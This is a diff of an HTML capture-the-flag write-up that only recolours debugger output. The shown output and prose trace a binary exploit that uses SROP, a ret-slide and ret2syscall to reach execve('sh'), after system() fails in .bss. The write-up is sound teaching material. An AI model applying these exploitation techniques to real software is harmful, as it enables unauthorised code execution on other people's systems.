+   <span style="color:#0550ae;">0x7f9545bdf4b7</span> &lt;<span style="color:#953800;">readlink</span>+12&gt;:	<span style="color:#116329;">jne    </span><span style="color:#0550ae;">0x7f9545bdf4c6</span> &lt;<span style="color:#953800;">readlink</span>+27&gt;
+   <span style="color:#0550ae;">0x7f9545bdf4b9</span> &lt;<span style="color:#953800;">readlink</span>+14&gt;:	<span style="color:#116329;">lea    </span><span style="color:#cf222e;">r8</span>,[<span style="color:#cf222e;">rsp</span>+<span style="color:#cf222e;">0xf</span>]
+   <span style="color:#0550ae;">0x7f9545bdf4be</span> &lt;<span style="color:#953800;">readlink</span>+19&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">edx</span>,<span style="color:#cf222e;">0x1</span>
+   <span style="color:#0550ae;">0x7f9545bdf4c3</span> &lt;<span style="color:#953800;">readlink</span>+24&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">rsi</span>,<span style="color:#cf222e;">r8</span>
+   <span style="color:#0550ae;">0x7f9545bdf4c6</span> &lt;<span style="color:#953800;">readlink</span>+27&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">eax</span>,<span style="color:#cf222e;">0x59</span>
+   <span style="color:#0550ae;">0x7f9545bdf4cb</span> &lt;<span style="color:#953800;">readlink</span>+32&gt;:	<span style="color:#116329;">syscall</span>
+   <span style="color:#0550ae;">0x7f9545bdf4cd</span> &lt;<span style="color:#953800;">readlink</span>+34&gt;:	<span style="color:#116329;">xor    </span><span style="color:#cf222e;">edx</span>,<span style="color:#cf222e;">edx</span>
+   <span style="color:#0550ae;">0x7f9545bdf4cf</span> &lt;<span style="color:#953800;">readlink</span>+36&gt;:	<span style="color:#116329;">test   </span><span style="color:#cf222e;">eax</span>,<span style="color:#cf222e;">eax</span>
+   <span style="color:#0550ae;">0x7f9545bdf4d1</span> &lt;<span style="color:#953800;">readlink</span>+38&gt;:	<span style="color:#116329;">cmovle </span><span style="color:#cf222e;">edx</span>,<span style="color:#cf222e;">eax</span>
+   <span style="color:#0550ae;">0x7f9545bdf4d4</span> &lt;<span style="color:#953800;">readlink</span>+41&gt;:	<span style="color:#116329;">cmp    </span><span style="color:#cf222e;">rsi</span>,<span style="color:#cf222e;">r8</span>
 <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>
 </code></pre>
 
@@ -1140,14 +1140,14 @@ After we prepare the SROP frame beneath our soon-to-be-overwritten syscall gadge
 Debugging, we can see the ret-slide, the <span class='monospace'>pop rax</span> and the overwritten <span class='monospace'>libc</span> pointer:
 
 <pre><code><span style="color:#0550ae;">---------------------------------------------------------------------------------------------------------------------------- stack ----
-</span>$rsp  <span style="color:#0550ae;">0x0000004049b0</span>|+0x0000|+000: <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#cf222e;">0x0000000000401181</span> &lt;main+0x24&gt;  -&gt;  0x00000000c35850c3<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  retaddr[0], $rbp, $rip</span>
-      <span style="color:#0550ae;">0x0000004049b8</span>|+0x0008|+001: <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#cf222e;">0x0000000000401181</span> &lt;main+0x24&gt;  -&gt;  0x00000000c35850c3<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  retaddr[0], $rbp, $rip</span>
-      <span style="color:#0550ae;">0x0000004049c0</span>|+0x0010|+002: <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#cf222e;">0x0000000000401181</span> &lt;main+0x24&gt;  -&gt;  0x00000000c35850c3<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  retaddr[0], $rbp, $rip</span>
-      <span style="color:#0550ae;">0x0000004049c8</span>|+0x0018|+003: <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#cf222e;">0x0000000000401181</span> &lt;main+0x24&gt;  -&gt;  0x00000000c35850c3<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  retaddr[0], $rbp, $rip</span>
-      <span style="color:#0550ae;">0x0000004049d0</span>|+0x0020|+004: <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#cf222e;">0x0000000000401181</span> &lt;main+0x24&gt;  -&gt;  0x00000000c35850c3<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  retaddr[0], $rbp, $rip</span>
-      <span style="color:#0550ae;">0x0000004049d8</span>|+0x0028|+005: <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#cf222e;">0x0000000000401183</span>  -&gt;  0x000000000000c358
+</span>$rsp  <span style="color:#0550ae;">0x0000004049b0</span>|+0x0000|+000: <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#0550ae;">0x0000000000401181</span> &lt;main+0x24&gt;  -&gt;  0x00000000c35850c3<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  retaddr[0], $rbp, $rip</span>
+      <span style="color:#0550ae;">0x0000004049b8</span>|+0x0008|+001: <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#0550ae;">0x0000000000401181</span> &lt;main+0x24&gt;  -&gt;  0x00000000c35850c3<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  retaddr[0], $rbp, $rip</span>
+      <span style="color:#0550ae;">0x0000004049c0</span>|+0x0010|+002: <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#0550ae;">0x0000000000401181</span> &lt;main+0x24&gt;  -&gt;  0x00000000c35850c3<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  retaddr[0], $rbp, $rip</span>
+      <span style="color:#0550ae;">0x0000004049c8</span>|+0x0018|+003: <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#0550ae;">0x0000000000401181</span> &lt;main+0x24&gt;  -&gt;  0x00000000c35850c3<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  retaddr[0], $rbp, $rip</span>
+      <span style="color:#0550ae;">0x0000004049d0</span>|+0x0020|+004: <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#0550ae;">0x0000000000401181</span> &lt;main+0x24&gt;  -&gt;  0x00000000c35850c3<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">  &lt;-  retaddr[0], $rbp, $rip</span>
+      <span style="color:#0550ae;">0x0000004049d8</span>|+0x0028|+005: <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#0550ae;">0x0000000000401183</span>  -&gt;  0x000000000000c358
       <span style="color:#0550ae;">0x0000004049e0</span>|+0x0030|+006: 0x000000000000000f
-      <span style="color:#0550ae;">0x0000004049e8</span>|+0x0038|+007: <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#cf222e;">0x00007ffa8b0ea4a0</span> &lt;readlinkat+0x19&gt;  -&gt;  0x4e0fc085c931050f
+      <span style="color:#0550ae;">0x0000004049e8</span>|+0x0038|+007: <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#0550ae;">0x00007ffa8b0ea4a0</span> &lt;readlinkat+0x19&gt;  -&gt;  0x4e0fc085c931050f
 <span style="color:#0550ae;">-------------------------------------------------------------------------------------------------------- code: x86:64 (gdb-native) ----
 </span>    <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x401176 e8a5feffff            &lt;main+0x19&gt;   call   0x401020 &lt;read@plt&gt;</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x40117b b800000000            &lt;main+0x1e&gt;   mov    eax, 0x0</span>
@@ -1166,9 +1166,9 @@ Alpine containers actually need a slightly different <span class='monospace'>exe
     argv                 $rsi                 <span style="color:#116329;">0x00000000004047f0</span>  -&gt;  <span style="color:#116329;">0x00000000004047d0</span>  -&gt;  0x0000000000006873 (<span style="color:#953800;">'sh'</span>?)
     envp                 $rdx                 0x0000000000000000
 <span style="color:#0550ae;">-------------------------------------------------------------------------------------------------------------------------- threads ----
-</span>[*<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">Thread Id:1, tid:263</span>] Name: &quot;main&quot;, <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">stopped</span> at <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#cf222e;">0x7ffa8b0ea4a0</span> &lt;readlinkat+0x19&gt;, reason: <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#8250df;">SINGLE STEP</span>
+</span>[*<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">Thread Id:1, tid:263</span>] Name: &quot;main&quot;, <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">stopped</span> at <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#0550ae;">0x7ffa8b0ea4a0</span> &lt;readlinkat+0x19&gt;, reason: <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#8250df;">SINGLE STEP</span>
 <span style="color:#0550ae;">---------------------------------------------------------------------------------------------------------------------------- trace ----
-</span>[*<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">#0</span>] <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#cf222e;">0x7ffa8b0ea4a0</span> &lt;readlinkat+0x19&gt; (frame name: <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#953800;">__syscall4</span>)
+</span>[*<span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">#0</span>] <span style="text-decoration:underline;font-weight:bold;"></span><span style="text-decoration:underline;font-weight:bold;color:#0550ae;">0x7ffa8b0ea4a0</span> &lt;readlinkat+0x19&gt; (frame name: <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#953800;">__syscall4</span>)
 </code></pre>
 
 <h3>closing thoughts</h3>
@@ -1203,20 +1203,20 @@ Our only <span class='monospace'>rdi</span> control is <span class='monospace'>m
 That is, until <span class='monospace'>system</span> eventually segfaults. Baphomet has unfortunately failed to inform us that <span class='monospace'>system</span> calls <span class='monospace'>posix_spawn</span>, and <span class='monospace'>posix_spawn</span> requires <span class='monospace'>0x1628</span> bytes of stack space. Remember that we are now in <span class='monospace'>.bss</span>, which is a page long. Indeed, selling our soul to the Devil came with a price: it is, unfortunately, impossible to call <span class='monospace'>system()</span> at all.
 
 <pre><code><span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>x/16i posix_spawn
-   <span style="color:#cf222e;">0x7fb03338359b</span> &lt;<span style="color:#953800;">posix_spawn</span>&gt;:	<span style="color:#116329;">push   </span><span style="color:#cf222e;">r15</span>
-   <span style="color:#cf222e;">0x7fb03338359d</span> &lt;<span style="color:#953800;">posix_spawn</span>+2&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">r15</span>,<span style="color:#cf222e;">rsi</span>
-   <span style="color:#cf222e;">0x7fb0333835a0</span> &lt;<span style="color:#953800;">posix_spawn</span>+5&gt;:	<span style="color:#116329;">push   </span><span style="color:#cf222e;">r14</span>
-   <span style="color:#cf222e;">0x7fb0333835a2</span> &lt;<span style="color:#953800;">posix_spawn</span>+7&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">r14</span>,<span style="color:#cf222e;">rdx</span>
-   <span style="color:#cf222e;">0x7fb0333835a5</span> &lt;<span style="color:#953800;">posix_spawn</span>+10&gt;:	<span style="color:#116329;">push   </span><span style="color:#cf222e;">r13</span>
-   <span style="color:#cf222e;">0x7fb0333835a7</span> &lt;<span style="color:#953800;">posix_spawn</span>+12&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">r13</span>,<span style="color:#cf222e;">rdi</span>
-   <span style="color:#cf222e;">0x7fb0333835aa</span> &lt;<span style="color:#953800;">posix_spawn</span>+15&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">edi</span>,<span style="color:#cf222e;">0x1</span>
-   <span style="color:#cf222e;">0x7fb0333835af</span> &lt;<span style="color:#953800;">posix_spawn</span>+20&gt;:	<span style="color:#116329;">push   </span><span style="color:#cf222e;">r12</span>
-   <span style="color:#cf222e;">0x7fb0333835b1</span> &lt;<span style="color:#953800;">posix_spawn</span>+22&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">r12</span>,<span style="color:#cf222e;">r8</span>
-   <span style="color:#cf222e;">0x7fb0333835b4</span> &lt;<span style="color:#953800;">posix_spawn</span>+25&gt;:	<span style="color:#116329;">push   </span><span style="color:#cf222e;">rbp</span>
-   <span style="color:#cf222e;">0x7fb0333835b5</span> &lt;<span style="color:#953800;">posix_spawn</span>+26&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">rbp</span>,<span style="color:#cf222e;">r9</span>
-   <span style="color:#cf222e;">0x7fb0333835b8</span> &lt;<span style="color:#953800;">posix_spawn</span>+29&gt;:	<span style="color:#116329;">push   </span><span style="color:#cf222e;">rbx</span>
-   <span style="color:#cf222e;">0x7fb0333835b9</span> &lt;<span style="color:#953800;">posix_spawn</span>+30&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">rbx</span>,<span style="color:#cf222e;">rcx</span>
-   <span style="color:#cf222e;">0x7fb0333835bc</span> &lt;<span style="color:#953800;">posix_spawn</span>+33&gt;:	<span style="color:#116329;">sub    </span><span style="color:#cf222e;">rsp</span>,<span style="color:#cf222e;">0x1628</span>
+   <span style="color:#0550ae;">0x7fb03338359b</span> &lt;<span style="color:#953800;">posix_spawn</span>&gt;:	<span style="color:#116329;">push   </span><span style="color:#cf222e;">r15</span>
+   <span style="color:#0550ae;">0x7fb03338359d</span> &lt;<span style="color:#953800;">posix_spawn</span>+2&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">r15</span>,<span style="color:#cf222e;">rsi</span>
+   <span style="color:#0550ae;">0x7fb0333835a0</span> &lt;<span style="color:#953800;">posix_spawn</span>+5&gt;:	<span style="color:#116329;">push   </span><span style="color:#cf222e;">r14</span>
+   <span style="color:#0550ae;">0x7fb0333835a2</span> &lt;<span style="color:#953800;">posix_spawn</span>+7&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">r14</span>,<span style="color:#cf222e;">rdx</span>
+   <span style="color:#0550ae;">0x7fb0333835a5</span> &lt;<span style="color:#953800;">posix_spawn</span>+10&gt;:	<span style="color:#116329;">push   </span><span style="color:#cf222e;">r13</span>
+   <span style="color:#0550ae;">0x7fb0333835a7</span> &lt;<span style="color:#953800;">posix_spawn</span>+12&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">r13</span>,<span style="color:#cf222e;">rdi</span>
+   <span style="color:#0550ae;">0x7fb0333835aa</span> &lt;<span style="color:#953800;">posix_spawn</span>+15&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">edi</span>,<span style="color:#cf222e;">0x1</span>
+   <span style="color:#0550ae;">0x7fb0333835af</span> &lt;<span style="color:#953800;">posix_spawn</span>+20&gt;:	<span style="color:#116329;">push   </span><span style="color:#cf222e;">r12</span>
+   <span style="color:#0550ae;">0x7fb0333835b1</span> &lt;<span style="color:#953800;">posix_spawn</span>+22&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">r12</span>,<span style="color:#cf222e;">r8</span>
+   <span style="color:#0550ae;">0x7fb0333835b4</span> &lt;<span style="color:#953800;">posix_spawn</span>+25&gt;:	<span style="color:#116329;">push   </span><span style="color:#cf222e;">rbp</span>
+   <span style="color:#0550ae;">0x7fb0333835b5</span> &lt;<span style="color:#953800;">posix_spawn</span>+26&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">rbp</span>,<span style="color:#cf222e;">r9</span>
+   <span style="color:#0550ae;">0x7fb0333835b8</span> &lt;<span style="color:#953800;">posix_spawn</span>+29&gt;:	<span style="color:#116329;">push   </span><span style="color:#cf222e;">rbx</span>
+   <span style="color:#0550ae;">0x7fb0333835b9</span> &lt;<span style="color:#953800;">posix_spawn</span>+30&gt;:	<span style="color:#116329;">mov    </span><span style="color:#cf222e;">rbx</span>,<span style="color:#cf222e;">rcx</span>
+   <span style="color:#0550ae;">0x7fb0333835bc</span> &lt;<span style="color:#953800;">posix_spawn</span>+33&gt;:	<span style="color:#116329;">sub    </span><span style="color:#cf222e;">rsp</span>,<span style="color:#cf222e;">0x1628</span>
 </code></pre>
 
 At this juncture we go back to Christ, who tells us to just use a <span class='monospace'>ret2syscall</span>. He, however, reveals to us that we do not actually need SROP to set any registers. How? Using our <span class='monospace'>edi</span> value planted at <span class='monospace'>0x404008</span> and <span class='monospace'>pop rax</span>, we are <i>almost</i> ready to just directly perform an <span class='monospace'>execve</span> syscall anyway. We just need to set <span class='monospace'>rsi</span>. Helpfully, we still have the <span class='monospace'>add</span> primitive and just need to find something to <span class='monospace'>add</span> to.
